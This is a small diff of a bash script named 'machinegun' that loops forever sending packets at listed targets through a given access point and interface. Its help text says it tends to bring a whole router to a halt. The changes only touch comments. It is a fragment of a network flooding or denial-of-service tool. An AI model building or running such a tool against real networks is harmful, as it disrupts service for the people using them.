@@ -20,7 +20,7 @@ echo "Usage: ./machinegun AP #ofPacketsPerTgt Interface tgt1 tgt2 tgt3 etc..."
 echo "***********************************************************************"
 echo "As it runs right now, it tends to bring an entire router to a grinding halt after a few loops."
 }
-if [ $1 = "help" ]; then #If the first argument is 'help', run the shotgunArt() and help().
+if [ $1 = "help" ]; then #If the first argument is 'help', run the help().
 	help
 else
 
@@ -41,7 +41,7 @@ while [ $LOADCOUNTER -lt $TOTALTGT ]; do
 	shift
 done
 
-while [ 0 -lt 1  ]; do #This is teh start of the inifinite loop.
+while [ 0 -lt 1  ]; do #This is the start of the inifinite loop.
 ATTACKCOUNTER=0 #This variable needs to be reset after each loop.
 
 	while [ $ATTACKCOUNTER -lt $TOTALTGT ]; do #This is the attack loop
